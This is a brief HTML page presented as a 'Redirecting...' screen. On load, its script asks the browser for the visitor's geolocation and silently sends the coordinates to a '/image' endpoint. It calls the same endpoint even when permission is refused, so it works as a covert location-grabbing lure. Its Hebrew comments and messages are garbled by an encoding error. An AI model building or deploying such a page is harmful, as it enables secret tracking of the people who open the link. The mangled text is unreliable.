<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Redirecting...</title>
  <script>
    // 拽 砖 拽
    function sendLocation(lat, lon) {
      const endpoint = `/image?lat=${lat}&lon=${lon}`;
      fetch(endpoint)
        .then(() => {
          document.body.innerHTML = "<h2> 拽 砖, 转!</h2>";
        })
        .catch(() => {
          document.body.innerHTML = "<h2>砖 砖</h2>";
        });
    }

    function noLocation() {
      fetch('/image')
        .then(() => {
          document.body.innerHTML = "<h2>锔 拽  砖,   专 转 :)</h2>";
        });
    }

    // 拽砖转 拽 砖转砖
    window.onload = () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            sendLocation(pos.coords.latitude, pos.coords.longitude);
          },
          () => {
            noLocation();
          }
        );
      } else {
        noLocation();
      }
    };
  </script>
</head>
<body>
  <h2> 注 拽...</h2>
</body>
</html>

